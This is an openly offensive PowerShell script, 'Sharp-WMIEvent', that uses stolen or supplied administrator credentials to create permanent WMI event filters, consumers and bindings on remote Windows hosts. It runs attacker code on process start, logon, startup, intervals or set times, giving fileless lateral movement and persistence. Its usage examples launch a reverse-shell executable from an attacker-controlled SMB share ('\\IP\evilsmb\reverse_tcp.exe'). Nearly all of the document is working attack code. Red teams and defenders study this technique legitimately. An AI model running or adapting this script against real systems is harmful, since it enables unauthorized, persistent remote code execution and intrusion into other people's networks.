Function Sharp-WMIEvent {
<#

.SYNOPSIS

    The script realizes intranet lateral movement and permission persistence through WMI event subscription.

.DESCRIPTION

    Hackers can use the capabilities of WMI to deploy permanent event subscriptions on remote hosts and execute arbitrary
    code or other actions when that event occurs. ActiveScriptEventConsumer and CommandLineEventConsumer in the event 
    consumption class are mainly used. These two Event Consumers can execute any payload on a remote host in a fileless 
    manner. This technique is mainly used to complete permissions persistence on the target system, and can also be used 
    for lateral movement, and requires user credentials that provide administrator permissions on the remote host. For 
    more details, please read the relevant articles in LINK by yourself.

.LINK

    https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
    
.PARAMETER ComputerName

    Specifies the target computer system to add a permanent WMI event to. The default is the local computer.

.PARAMETER Domain

    Specifies the domain name of the target host. The default is the workgroup.

.PARAMETER Username

    Specifies the username of the target host for lateral movement.

.PARAMETER Password

    Specifies the password of the target host for lateral movement.

.PARAMETER FilterName

    Specifies the name of the event filter to create. The default is a random string of length 6.

.PARAMETER ConsumerName

    Specifies the name of the event consumer to create. The default is a random string of length 6.

.PARAMETER Trigger
    
    Specifies the event trigger to use. The options are ProcessStart, UserLogon, Interval, and Timed.

.PARAMETER ProcessName

    Specifies the process name when the ProcessStart trigger is selected.

.PARAMETER ScriptPath

    Specify the script to execute.

.PARAMETER Command

    Specify the command to execute.

.PARAMETER IntervalPeriod

    Specifies the interval period, in seconds, when the Interval trigger is selected.

.PARAMETER ExecutionTime

    Specifies the absolute time to generate a WMI event when the Timed trigger is selected.

.OUTPUTS

    Output will be shown in the console

.NOTES

    Version:        0.1
    Author:         WHOAMI
    Blog:           https://whoamianony.top/
    Date:           01/29/2022

.EXAMPLE

    Sharp-WMIEvent -Trigger ProcessStart -ProcessName svchost.exe -ComputerName <IP/Hostname> -Domain <Domain Name> -Username <Username> -Password <Password> -ScriptPath "C:\Sharp-WMIEvent\payload.js" -FilterName <Filter Name> -ConsumerName <Consumer Name>

    This command will create a permanent WMI event subscription on the target host specified by -ProcessName and run the script when the svchost.exe process starts.

.EXAMPLE

    Sharp-WMIEvent -Trigger ProcessStart -ProcessName svchost.exe -ComputerName <IP/Hostname> -Domain <Domain Name> -Username <Username> -Password <Password> -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>

    This command will create a permanent WMI event subscription on the target host specified by -ProcessName and execute the command when the svchost.exe process starts.

.EXAMPLE

    Sharp-WMIEvent -Trigger Startup -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>

    This command will create a permanent WMI event subscription and execute command within 5 minutes of system startup.

.EXAMPLE

    Sharp-WMIEvent -Trigger UserLogon -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
    
    This command will create a permanent WMI event subscription and execute the command when the user logs in.

.EXAMPLE

    Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>

    This command will create a permanent WMI event subscription and execute the command every 60 seconds.

.EXAMPLE

    Sharp-WMIEvent -Trigger Timed -ExecutionTime '08:00:00' -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>

    This command will create a permanent WMI event subscription and execute the command at 08:00:00.

#>


# Set Error Action to Silently Continue
#$ErrorActionPreference = "SilentlyContinue"

param (
        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Domain,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Username,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Password,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$FilterName,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ConsumerName,

        [Parameter(Mandatory = $false)]
        [ValidateSet('ProcessStart', 'Startup', 'UserLogon', 'Interval', 'Timed')]
        [ValidateNotNullOrEmpty()]
        [string]$Trigger,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ProcessName, 

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({Test-Path -Path $_})]
        [string]$ScriptPath,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Command,
        
        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [Int32]$IntervalPeriod,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [datetime]$ExecutionTime = '08:00:00'
    )

function FormatStatus([string]$Flag, [string]$Message) {
    If($Flag -eq "1") {
        Write-Host "[+] " -ForegroundColor:Green -NoNewline
        Write-Host $Message
    }ElseIf($Flag -eq "0") {
        Write-Host "[-] " -ForegroundColor:Red -NoNewline
        Write-Host $Message
    }
}

#----------------------------------------[Create GlobalArgs]-------------------------------------

    $GlobalArgs = @{

    }

    If(($PSBoundParameters["Domain"]) -and ($PSBoundParameters["Username"]) -and ($PSBoundParameters["Password"]) -and ($PSBoundParameters["ComputerName"])) {
        $Username = $Domain + "\" + $Username
        $SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword

        $GlobalArgs["Credential"] = $Credential
        $GlobalArgs["ComputerName"] = $ComputerName
    }

#------------------------------------------[Create Event Filter]---------------------------------------

    Switch ($Trigger)
    {
        'ProcessStart'
        {
            $FilterQuery = "SELECT * FROM Win32_ProcessStartTrace where processname ='$ProcessName'"
        }

        'Startup'
        {
            $FilterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        }

        'UserLogon'
        {
            $FilterQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
        }

        'Interval'
        {
            $TimerId = -join((48..57 + 65..90 + 97..122) | get-random -count 6 | %{[char]$_})
            #$TimerIdToRemove = Get-WmiObject -Class __IntervalTimerInstruction -Filter "TimerId='$TimerId'" @GlobalArgs
            #if($TimerIdToRemove) { $TimerIdToRemove | Remove-WmiObject}

            $IntervalArgs = @{
                IntervalBetweenEvents = ($IntervalPeriod * 1000); TimerId = $TimerId
            }

            Set-WmiInstance -class '__IntervalTimerInstruction' -Arguments $IntervalArgs @GlobalArgs
            $FilterQuery = "Select * from __TimerEvent where TimerId = '$TimerId'"
        }

        'Timed'
        {
            $FilterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $($ExecutionTime.Hour.ToString()) AND TargetInstance.Minute = $($ExecutionTime.Minute.ToString()) GROUP WITHIN 60"
        }
    }
    
    If([String]::IsNullOrEmpty($FilterName)) {
        $FilterName = -join((48..57 + 65..90 + 97..122) | get-random -count 6 | %{[char]$_})
    }

    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $FilterName
        Query = $FilterQuery
        QueryLanguage = 'WQL'
    }

    FormatStatus 1 "Creating The WMI Event Filter $FilterName"
    If($GlobalArgs.Count -eq 0) {
        $EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs
    }else {
        $EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs
    }


#-----------------------------------------[Create Event Consumer]---------------------------------------

    If([String]::IsNullOrEmpty($ConsumerName)) {
        $ConsumerName = -join((48..57 + 65..90 + 97..122) | Get-Random -count 6 | %{[char]$_})
    }
    
    If(![String]::IsNullOrEmpty($ScriptPath)) {
        $Code = [System.IO.File]::ReadAllText($ScriptPath)
        $ActiveScriptEventConsumerArgs = @{
            Name = $ConsumerName
            ScriptingEngine = 'JScript'
            ScriptText = $Code
        }

        FormatStatus 1 "Creating The WMI Event Consumer $ConsumerName"
        If($GlobalArgs.Count -eq 0) {
            $EventConsumer =  Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $ActiveScriptEventConsumerArgs
        }else {
            $EventConsumer =  Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $ActiveScriptEventConsumerArgs @GlobalArgs
        }
    }
    
    If(![String]::IsNullOrEmpty($Command)) {
        $CommandLineEventConsumerArgs  = @{
            Name = $ConsumerName
            CommandLineTemplate = $Command
        }

        FormatStatus 1 "Creating The WMI Event Consumer $ConsumerName"
        If($GlobalArgs.Count -eq 0) {
            $EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs
        }else {
            $EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs
        }
    }


#--------------------------------------[Create Filter Consumer Binding]------------------------------------

    $FilterConsumerBindingArgs = @{
        Filter = $EventFilter
        Consumer = $EventConsumer
    }
    
    FormatStatus 1 "Creating The WMI Event Filter And Event Consumer Binding"
    If($GlobalArgs.Count -eq 0) {
        $FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs
    }else {
        $FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs
    }

#--------------------------------------[Remove WMI Event]------------------------------------

    #$EventConsumerToRemove = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$ConsumerName'"
    #$EventFilterToRemove = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$FilterName'"
    #$FilterConsumerBindingToRemove = Get-WmiObject -Class __FilterToConsumerbinding -Namespace root\subscription -Filter "Consumer = ""CommandLineEventConsumer.name='$ConsumerName'"""

    #if($FilterConsumerBindingToRemove ) {$FilterConsumerBindingToRemove | Remove-WmiObject}
    #if($EventConsumerToRemove) { $EventConsumerToRemove | Remove-WmiObject}
    #if($EventFilterToRemove) { $EventFilterToRemove | Remove-WmiObject}
}